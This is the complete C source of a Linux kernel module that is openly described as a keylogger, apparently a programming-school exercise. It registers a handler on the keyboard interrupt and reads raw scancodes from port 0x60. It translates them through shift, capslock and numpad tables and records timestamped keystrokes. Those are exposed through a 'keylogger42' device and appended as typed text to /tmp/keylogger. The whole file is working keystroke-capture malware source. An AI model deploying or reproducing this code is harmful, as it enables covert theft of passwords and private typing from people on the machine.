#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/time.h>
#include <linux/seq_file.h>

#define COUNT_OF(x) (sizeof(x) / sizeof(*x))

#define NUMLOCK_KEY	0x45
#define CAPSLOCK_KEY	0x3a
#define LSHIFT_KEY	0x2A
#define RSHIFT_KEY	0x36

#define CAPSLOCK_I	0x0
#define SHIFT_I		0x1
#define NUMLOCK_I	0x2

#define FLUSH_LIMIT	512

#define IS_PRESSED(x) (!x)
#define IS_RELEASED(x) (x)
#define IS_SHIFT(x) (x == LSHIFT_KEY || x == RSHIFT_KEY)
#define IS_CAPSLOCK(x) (x == CAPSLOCK_KEY)
#define IS_NUMLOCK(x) (x == NUMLOCK_KEY)
#define KEY_IN_NUMPAD(x) (x >= 0x47 && x <= 0x53)

struct keycode_s {
	char ascii;
	const char *name;
};

struct stroke_s {
	unsigned char key;
	unsigned char state;
	char value;
	char ascii;
	const char *name;
	struct tm time;
	struct list_head list;
};

static void	irq_keylogger(unsigned long data);
static ssize_t	write_log(void);

static LIST_HEAD(strokehead);

/*
 * This variable is used as an identifier for shared interrupt lines.
 * Since many drivers can be loaded on the same line, free_irq needs
 * to know what driver it should free.
 */

static const void *line_id = "keylogger42";

/*
 * An ISR blocks any other interrupt, so the goal is to leave the interrupt
 * handler as fast as we can. To do that I use a tasklet, which schedule a
 * function to be executed later, when the kernel has some time.
 */

DECLARE_TASKLET(tasklet_s, irq_keylogger, 0);

DEFINE_RWLOCK(log_lock);
DEFINE_RWLOCK(misc_lock);

const struct keycode_s keytable[] = {
	{0x0, "Empty"}, {0x0, "ESC"}, {'1', "1"}, {'2', "2"},
	{'3', "3"}, {'4', "4"}, {'5', "5"}, {'6', "6"},
	{'7', "7"}, {'8', "8"}, {'9', "9"}, {'0', "0"},
	{'-', "-"}, {'=', "="}, {0x0, "BACKSPACE"}, {'\t', "TAB"},
	{'q', "q"}, {'w', "w"}, {'e', "e"}, {'r', "r"},
	{'t', "t"}, {'y', "y"}, {'u', "u"}, {'i', "i"},
	{'o', "o"}, {'p', "p"}, {'[', "["}, {']', "]"},
	{'\n', "ENTER"}, {0x0, "CONTROL"}, {'a', "a"}, {'s', "s"},
	{'d', "d"}, {'f', "f"}, {'g', "g"}, {'h', "h"},
	{'j', "j"}, {'k', "k"}, {'l', "l"}, {';', ";"},
	{'\'', "\'"}, {'`', "`"}, {0x0, "LEFT SHIFT"},
	{'\\', "\\"}, {'z', "z"}, {'x', "x"}, {'c', "c"},
	{'v', "v"}, {'b', "b"}, {'n', "n"}, {'m', "m"},
	{',', ","}, {'.', "."}, {'/', "/"}, {0x0, "RIGHT SHIFT"},
	{'*', "(NUM) *"}, {0x0, "ALT"}, {' ', "SPACE"},
	{0x0, "CAPSLOCK"}, {0x0, "F1"}, {0x0, "F2"},
	{0x0, "F3"}, {0x0, "F4"}, {0x0, "F5"}, {0x0, "F6"},
	{0x0, "F7"}, {0x0, "F8"}, {0x0, "F9"}, {0x0, "F10"},
	{0x0, "NUMLOCK"}, {0x0, "SCREENLOCK"}, {0x0, "HOME"},
	{0x0, "ARROW UP"}, {0x0, "PAGE UP"}, {'-', "(NUM) -"},
	{0x0, "ARROW LEFT"}, {'5', "(NUM) 5"}, {0x0, "ARROW RIGHT"},
	{'+', "(NUM) +"}, {0x0, "END"}, {0x0, "ARROW DOWN"},
	{0x0, "PAGE DOWN"}, {0x0, "INSERT"}, {0x0, "DELETE"},
	{0x0, NULL}
};

const struct keycode_s keytable_shift[] = {
	{0x0, "Empty"}, {0x0, "ESC"}, {'!', "!"}, {'@', "@"},
	{'#', "#"}, {'$', "$"}, {'%', "%"}, {'^', "^"},
	{'&', "&"}, {'*', "*"}, {'(', "("}, {')', ")"},
	{'_', "_"}, {'+', "+"}, {0x0, "BACKSPACE"}, {'\t', "TAB"},
	{'Q', "Q"}, {'W', "W"}, {'E', "E"}, {'R', "R"},
	{'T', "T"}, {'Y', "Y"}, {'U', "U"}, {'I', "I"},
	{'O', "O"}, {'P', "P"}, {'{', "{"}, {'}', "}"},
	{'\n', "ENTER"}, {0x0, "CONTROL"}, {'A', "A"}, {'S', "S"},
	{'D', "D"}, {'F', "F"}, {'G', "G"}, {'H', "H"},
	{'J', "J"}, {'K', "K"}, {'L', "L"}, {':', ":"},
	{'\"', "\""}, {'~', "~"}, {0x0, "LEFT SHIFT"},
	{'\\', "\\"}, {'Z', "Z"}, {'X', "X"}, {'C', "C"},
	{'V', "V"}, {'B', "B"}, {'N', "N"}, {'M', "M"},
	{'<', "<"}, {'>', ">"}, {'?', "?"}, {0x0, "RIGHT SHIFT"},
	{0x0, "PRINT"}, {0x0, "ALT"}, {' ', "SPACE"},
	{0x0, "CAPSLOCK"}, {0x0, "F1"}, {0x0, "F2"},
	{0x0, "F3"}, {0x0, "F4"}, {0x0, "F5"}, {0x0, "F6"},
	{0x0, "F7"}, {0x0, "F8"}, {0x0, "F9"}, {0x0, "F10"},
	{0x0, "NUMLOCK"}, {0x0, "SCREENLOCK"}, {0x0, "HOME"},
	{0x0, "ARROW UP"}, {0x0, "PAGE UP"}, {'-', "(NUM) -"},
	{0x0, "ARROW LEFT"}, {'5', "(NUM) 5"}, {0x0, "ARROW RIGHT"},
	{'+', "(NUM) +"}, {0x0, "END"}, {0x0, "ARROW DOWN"},
	{0x0, "PAGE DOWN"}, {0x0, "INSERT"}, {0x0, "DELETE"},
	{0x0, NULL}
};

const struct keycode_s keytable_numpad[] = {
	{'7', "(NUM) 7"}, {'8', "(NUM) 8"}, {'9', "(NUM) 9"},
	{'-', "(NUM) -"}, {'4', "(NUM) 4"}, {'5', "(NUM) 5"},
	{'6', "(NUM) 6"}, {'+', "(NUM) +"}, {'1', "(NUM) 1"},
	{'2', "(NUM) 2"}, {'3', "(NUM) 3"}, {'0', "(NUM) 0"},
	{'.', "(NUM) ."}
};

static const unsigned int keytable_len_max = COUNT_OF(keytable);

static int keylogger_show(struct seq_file *seq, void *v)
{
	const struct stroke_s *cur;
	static const char * const state_str[] = {
		"RELEASED", "PRESSED"
	};

	read_lock(&misc_lock);
	list_for_each_entry(cur, &strokehead, list) {
		seq_printf(seq, "%02d:%02d:%02d   %-13s (%#.2x) %s\n",
				cur->time.tm_hour,
				cur->time.tm_min,
				cur->time.tm_sec,
				cur->name,
				cur->key,
				state_str[IS_PRESSED(cur->state)]);
	}
	read_unlock(&misc_lock);
	return 0;
}

static int my_open(struct inode *inode, struct file *file)
{
	/*
	 * Seq open does not use private_data, and will throw an WARN_ON
	 * if not set to null.
	 */
	file->private_data = NULL;
	return single_open(file, keylogger_show, NULL);
}

static int my_release(struct inode *inode, struct file *file)
{
	return single_release(inode, file);
}

static void get_stroke_time(struct tm *time)
{
	struct timeval tv;

	do_gettimeofday(&tv);

	/*
	 * time_to_tm converts calendar time to tm struct.
	 * totalsecs is calibrated on UTC, so we add 1 hour to get GMT+1.
	 */
	time_to_tm(tv.tv_sec, 3600, time);
}

static const struct keycode_s *get_table_entry(int scancode, int state)
{
	static unsigned char toggle[3] = {0, 0, 1};
	const struct keycode_s *table_entry;

	if (IS_CAPSLOCK(scancode) && IS_PRESSED(state)) {
		toggle[CAPSLOCK_I] ^= 1;
		toggle[SHIFT_I] ^= 1;
	} else if (IS_SHIFT(scancode)) {
		toggle[SHIFT_I] = IS_PRESSED(state);
		if (toggle[CAPSLOCK_I])
			toggle[SHIFT_I] ^= 1;
	} else if (IS_NUMLOCK(scancode) && IS_PRESSED(state))
		toggle[NUMLOCK_I] ^= 1;

	if (toggle[SHIFT_I])
		table_entry = &keytable_shift[scancode];
	else if (toggle[NUMLOCK_I] && KEY_IN_NUMPAD(scancode))
		table_entry = &keytable_numpad[scancode - 0x47];
	else
		table_entry = &keytable[scancode];
	return table_entry;
}

static void free_list(void)
{
	const struct stroke_s *cur;
	const struct stroke_s *tmp;

	list_for_each_entry_safe(cur, tmp, &strokehead, list) {
		kfree(cur);
	}
}

static void flush_list(void)
{
	write_log();
	free_list();
	list_del_init(&strokehead);
}

static void irq_keylogger(unsigned long data)
{
	struct stroke_s *stroke;
	int scancode;
	int state;

	const struct keycode_s *table_entry;
	static int count;

	++count;
	if (count == FLUSH_LIMIT) {
		flush_list();
		count = 0;
	}

	scancode = inb(0x60);
	state = (scancode & 0x80) >> 0x7;
	scancode &= 0x7F;

	if (scancode >= keytable_len_max)
		return;

	stroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);
	if (!stroke)
		return;

	table_entry = get_table_entry(scancode, state);

	stroke->state = state;
	stroke->key = scancode;
	stroke->ascii = table_entry->ascii;
	stroke->name = table_entry->name;
	get_stroke_time(&stroke->time);

	list_add_tail(&stroke->list, &strokehead);
}

static irqreturn_t irq_handler(int irq, void *dev_id)
{
	tasklet_schedule(&tasklet_s);
	return IRQ_HANDLED;
}

static const struct file_operations misc_fops = {
	.owner = THIS_MODULE,
	.open = my_open,
	.read = seq_read,
	.release = my_release
};

static struct miscdevice misc_s = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "keylogger42",
	.fops = &misc_fops
};

static ssize_t file_write(struct file *file, const void *buf, size_t n)
{
	ssize_t ret = 0;
	loff_t offset = 0;

	read_lock(&log_lock);
	ret = kernel_write(file, buf, n, &offset);
	read_unlock(&log_lock);
	return ret;
}

static ssize_t write_log(void)
{
	struct stroke_s *cur = NULL;
	char buf[1024] = {0};
	int i = 0;
	ssize_t ret = 0;
	struct file *file;
	mm_segment_t oldfs;

	oldfs = get_fs();
	set_fs(get_ds());
	file = filp_open("/tmp/keylogger", O_CREAT | O_WRONLY | O_APPEND, 0444);
	if (IS_ERR(file))
		return -ENOENT;
	list_for_each_entry(cur, &strokehead, list) {
		if (i == sizeof(buf) - 1) {
			ret = file_write(file, buf, i);
			if (ret < 0)
				goto out;
			i = 0;
		}
		if (IS_PRESSED(cur->state) && cur->ascii)
			buf[i++] = cur->ascii;
	}
	ret = file_write(file, buf, i);
out:
	set_fs(oldfs);
	filp_close(file, NULL);
	return ret;
}

static int __init init_keyboard(void)
{
	int ret;

	ret = request_irq(1,
			irq_handler,
			IRQF_SHARED,
			"keylogger42",
			(void *)line_id);
	if (ret) {
		pr_err("Could not start keylogger, request_irq() failed.\n");
		return ret;
	}
	pr_info("LOADED -- 42 keylogger module.\n");
	return misc_register(&misc_s);
}

static void __exit exit_keyboard(void)
{
	free_irq(1, (void *)line_id);
	tasklet_kill(&tasklet_s);
	if (write_log() < 0)
		pr_warn("WARNING! Something went wrong writing log file.\n");
	free_list();
	pr_info("UNLOADED -- 42 keylogger module.\n");
	misc_deregister(&misc_s);
}

module_init(init_keyboard);
module_exit(exit_keyboard);

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("agouby");
MODULE_DESCRIPTION("Keyboard driver, keylogger");
